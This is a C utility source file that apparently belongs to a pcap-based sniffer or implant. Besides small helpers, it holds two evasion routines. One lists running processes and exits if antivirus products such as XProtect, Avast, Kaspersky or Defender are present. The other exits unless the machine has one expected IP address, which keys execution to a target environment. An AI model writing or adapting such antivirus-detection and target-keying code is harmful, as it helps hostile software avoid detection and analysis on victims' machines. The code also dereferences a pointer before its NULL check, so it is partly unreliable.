#include "utils.h"

const char* KNOWN_AV_LIST[] = {"XProtect", "avast", "avg", "kaspersky", "defender"};
const int KNOWN_AV_NUM = 5;

void capterror(pcap_t *caps, char *message) {
    pcap_perror(caps,message);
    exit (-1);
}

void signal_handler(int sig) {
    /* the ugly way ... */
    _exit(0);
}

void *smalloc(size_t size) {
    void	*p;

    if ((p=malloc(size))==NULL) {
	exit(-1);
    }
    memset(p,0,size);
    return p;
}

void check_for_correct_ip() {
    char ip_addr[NI_MAXHOST];
    struct ifaddrs *ifaddr, *ifa;
    int s, family;
    unsigned long sockaddr_struct_size;

    if(IP_VERSION == AF_INET) {
        sockaddr_struct_size = sizeof(struct sockaddr_in);
    } else {
        sockaddr_struct_size = sizeof(struct sockaddr_in6);
    }

    if((s = getifaddrs(&ifaddr)) != 0) {
        fprintf(stderr, "getifaddrs() failed: %s\n", strerror(s));
    }

    for(ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        family = ifa->ifa_addr->sa_family;

        if (ifa->ifa_addr == NULL)
            continue;

        if(family != IP_VERSION) {
            continue;
        }
        
        s = getnameinfo(ifa->ifa_addr, sockaddr_struct_size, ip_addr, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
        if (s != 0){
            LOG("getnameinfo() failed: %s\n", gai_strerror(s));
            exit(EXIT_FAILURE);
        }

        if (strcmp(ip_addr, IPV4_LOOPBACK_ADDR) == 0 || strcmp(ip_addr, IPV6_LOOPBACK_ADDR) == 0)
            continue;

        LOG("IPv4 %s: %s\n", ifa->ifa_name, ip_addr);

        freeifaddrs(ifaddr);
        
        if(strcmp(ip_addr, CORRECT_IP_VERSION) == 0) {
            return;
        } else {
            errno = ENXIO;
            fprintf(stderr, "IP address not found\n");
            exit(EXIT_FAILURE);
        }
    }

    fprintf(stderr, "Family not in AF_INET\n");
    exit(EXIT_FAILURE);
}

void check_for_antivirus() {
    FILE *file = popen("ps -A", "r");

    if(!file) {
        fprintf(stderr, "popen failed\n");
        exit(EXIT_FAILURE);
    }

    char buffer[256];
    while(fgets(buffer, sizeof(buffer), file) != NULL) {
        for(int i = 0; i < KNOWN_AV_NUM; i++) {
            if(strstr(buffer, KNOWN_AV_LIST[i]) != NULL) {
                fprintf(stderr, "Antivirus %s found. Abort.\n", KNOWN_AV_LIST[i]);
                pclose(file);
                exit(EXIT_FAILURE);
            }
        }
    }
    
    pclose(file);
    return;
}